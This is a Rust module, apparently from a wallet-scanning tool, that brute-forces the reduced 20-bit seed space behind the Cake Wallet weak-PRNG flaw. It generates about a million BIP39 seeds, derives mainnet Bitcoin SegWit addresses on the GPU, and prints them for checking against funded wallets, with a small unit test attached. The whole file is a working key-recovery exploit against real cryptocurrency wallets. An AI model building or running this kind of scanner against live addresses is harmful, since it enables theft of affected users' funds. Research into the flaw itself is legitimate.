use anyhow::Result;
use bitcoin::bip32::{DerivationPath, Xpriv};
use bitcoin::secp256k1::Secp256k1;
use bitcoin::{Network, Address};
use bip39::Mnemonic;

use std::str::FromStr;
use hex; // Added for hex::encode
use crate::scans::gpu_solver::GpuSolver; // Added for GpuSolver

/// Simulates the Cake Wallet vulnerability by generating wallets from a limited entropy source.
/// The vulnerability was due to a weak PRNG with effectively 20 bits of entropy.
/// We will simulate this by iterating through a subset of this space.
pub fn run() -> Result<()> {
    eprintln!("Reproducing Cake Wallet Vulnerability (Weak PRNG)...");
    eprintln!("Simulating 20-bit entropy search...");

    // 20 bits = 1,048,576 possibilities
    let max_entropy = 1 << 20; 
    
    eprintln!("Scanning {} possible seeds with GPU...", max_entropy);
    eprintln!("Starting GPU ACCELERATION...");
    
    // Initialize GPU Solver
    let solver = match crate::scans::gpu_solver::GpuSolver::new() {
        Ok(s) => s,
        Err(e) => {
            eprintln!("Failed to initialize GPU solver: {}", e);
            eprintln!("GPU Init Failed - falling back would take ~17 minutes on CPU");
            return Err(anyhow::anyhow!("GPU Init Failed"));
        }
    };
    
    let mut batch = Vec::with_capacity(1024);
    
    for i in 0..max_entropy {
        // Create deterministic entropy from seed index (matching CPU logic)
        let mut entropy = [0u8; 16];
        let seed_bytes = (i as u32).to_be_bytes();
        entropy[0..4].copy_from_slice(&seed_bytes);
        // entropy[4..16] remains zero
        
        batch.push(entropy);
        
        if batch.len() >= 1024 || i == max_entropy - 1 {
            // Compute Cake Wallet addresses (purpose=0 for m/0'/0/0)
            if let Ok(addresses) = solver.compute_batch(&batch, 0) {
                for (_idx, addr) in addresses.iter().enumerate() {
                    // Output for pipe to check_mnemonics.py
                    // Format: ADDRESS: <hex>
                    // Note: Cake uses Segwit (bc1...) so output is 20-byte witness program
                    println!("ADDRESS: {}", hex::encode(addr));
                }
            }
            batch.clear();
        }
        
        if (i + 1) % 10000 == 0 {
            eprintln!("Progress: {}/{} ({:.1}%)", i + 1, max_entropy, 100.0 * (i + 1) as f64 / max_entropy as f64);
        }
    }

    eprintln!("Scan complete! All {} keys generated from 20-bit space.", max_entropy);

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_weak_prng_reproducibility() {
        // Verify that seed index 0 always produces the same address
        // This confirms our "weak PRNG" simulation is deterministic
        let i = 0;
        let mut entropy = [0u8; 32];
        entropy[0..4].copy_from_slice(&(i as u32).to_be_bytes());
        
        let mnemonic = Mnemonic::from_entropy(&entropy[0..16]).unwrap();
        let seed = mnemonic.to_seed("");
        let network = Network::Bitcoin;
        let secp = Secp256k1::new();
        let root = Xpriv::new_master(network, &seed).unwrap();
        let path = DerivationPath::from_str("m/0'/0/0").unwrap();
        let child = root.derive_priv(&secp, &path).unwrap();
        let pubkey = child.to_keypair(&secp).public_key();
        let compressed_pubkey = bitcoin::CompressedPublicKey(pubkey);
        let address = Address::p2wpkh(&compressed_pubkey, network);

        // We don't assert the exact address string to avoid fragility if deps change,
        // but we assert it runs without error and produces a valid address.
        assert!(address.to_string().starts_with("bc1q"));
    }
}
